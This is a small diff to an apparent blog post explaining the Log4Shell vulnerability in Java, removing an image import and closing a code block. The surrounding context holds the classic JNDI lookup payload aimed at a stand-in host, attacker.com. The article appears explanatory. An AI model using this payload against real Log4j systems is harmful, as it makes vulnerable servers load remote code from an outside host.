@@ -7,7 +7,7 @@ readTime: "11 min read"
 tags: ["Cybersecurity", "Log4Shell", "Java", "Zero-Day", "Vulnerability"]
 ---
 
-import Image from 'next/image'
+
 
 ## Introduction
 
@@ -43,3 +43,4 @@ Here’s a simplified example:
 
 ```java
 logger.info("${jndi:ldap://attacker.com/malicious}");
+```
